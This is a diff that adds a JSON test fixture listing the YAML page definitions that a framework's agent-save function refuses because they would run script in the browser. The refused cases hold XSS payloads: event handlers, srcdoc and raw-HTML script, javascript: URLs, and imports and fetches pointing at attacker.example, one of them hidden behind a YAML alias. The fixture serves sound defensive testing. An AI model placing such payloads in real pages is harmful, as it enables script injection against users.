@@ -1,0 +1,96 @@
+{
+  "$comment": "R6: what mateu_save_spec refuses because the saved page would run code in the browser. A saved spec is served through the ordinary (trusted) render path, so an agent may not write what the untrusted strip (conformance/untrusted) would take out of a pushed screen. Each case is checked with agentRefusal(\"component\", yaml) in Java, .NET, Python and the sidecar; refused cases must answer exactly `reason`, allowed ones null. The sidecar has no YAML parser and applies the rule to the text, conservatively, so every refused case is refused by all four, and the allowed ones are chosen so the text rules allow them too.",
+  "reason": "A definition saved by an agent may not run code in the browser: no event-handler, import or srcdoc attribute, no raw-HTML or script-capable element, no javascript: url, RunJS rule or action js, and no MicroFrontend loaded from another server.",
+  "cases": [
+    {
+      "name": "an Element import",
+      "refused": true,
+      "yaml": "type: VerticalLayout\ncontent:\n  - type: Element\n    name: x-evil\n    attributes:\n      import: https://attacker.example/evil.js\n"
+    },
+    {
+      "name": "a literal event handler",
+      "refused": true,
+      "yaml": "type: Element\nname: img\nattributes:\n  src: x.png\n  onerror: fetch('https://attacker.example/')\n"
+    },
+    {
+      "name": "a handler in another case",
+      "refused": true,
+      "yaml": "type: Element\nname: img\nattributes:\n  ONLOAD: x()\n"
+    },
+    {
+      "name": "a srcdoc",
+      "refused": true,
+      "yaml": "type: Element\nname: iframe-ish\nattributes:\n  srcdoc: <script>1</script>\n"
+    },
+    {
+      "name": "raw HTML content",
+      "refused": true,
+      "yaml": "type: Element\nname: div\ncontent: <img src=x onerror=alert(1)>\nhtml: true\n"
+    },
+    {
+      "name": "a script element",
+      "refused": true,
+      "yaml": "type: Element\nname: script\ncontent: alert(1)\n"
+    },
+    {
+      "name": "a framework element",
+      "refused": true,
+      "yaml": "type: Element\nname: mateu-ux\nattributes:\n  baseUrl: https://attacker.example\n"
+    },
+    {
+      "name": "a javascript: url",
+      "refused": true,
+      "yaml": "type: Element\nname: a\nattributes:\n  href: \" javascript:alert(1)\"\ncontent: Open\n"
+    },
+    {
+      "name": "a data: url in a url attribute",
+      "refused": true,
+      "yaml": "type: Element\nname: a\nattributes:\n  href: data:text/html,x\ncontent: Open\n"
+    },
+    {
+      "name": "a RunJS rule",
+      "refused": true,
+      "yaml": "type: FormLayout\nrules:\n  - filter: \"true\"\n    action: RunJS\n    value: alert(1)\ncontent: []\n"
+    },
+    {
+      "name": "an action's js",
+      "refused": true,
+      "yaml": "type: VerticalLayout\nactions:\n  - id: go\n    js: alert(1)\ncontent: []\n"
+    },
+    {
+      "name": "a MicroFrontend from another server",
+      "refused": true,
+      "yaml": "type: MicroFrontend\nbaseUrl: https://attacker.example\nroute: /x\n"
+    },
+    {
+      "name": "a MicroFrontend from a backslash host",
+      "refused": true,
+      "yaml": "type: MicroFrontend\nbaseUrl: \"\\\\\\\\attacker.example\"\nroute: /x\n"
+    },
+    {
+      "name": "an import behind an alias",
+      "refused": true,
+      "yaml": "type: VerticalLayout\nlinks: &a\n  import: https://attacker.example/evil.js\ncontent:\n  - type: Element\n    name: x-evil\n    attributes: *a\n"
+    },
+    {
+      "name": "a plain page",
+      "refused": false,
+      "yaml": "type: VerticalLayout\ncontent:\n  - type: Text\n    text: Customer\n    container: h2\n  - type: Button\n    label: Save\n    actionId: save\n"
+    },
+    {
+      "name": "a safe element with event bindings",
+      "refused": false,
+      "yaml": "type: Element\nname: img\nattributes:\n  src: https://cdn.example/x.png\n  alt: A\non:\n  click: save\n"
+    },
+    {
+      "name": "a grid selection action",
+      "refused": false,
+      "yaml": "type: Gantt\nonTaskSelectionActionId: pick\ntasks: []\n"
+    },
+    {
+      "name": "a same-origin MicroFrontend",
+      "refused": false,
+      "yaml": "type: MicroFrontend\nbaseUrl: /orders\nroute: /x\n"
+    }
+  ]
+}
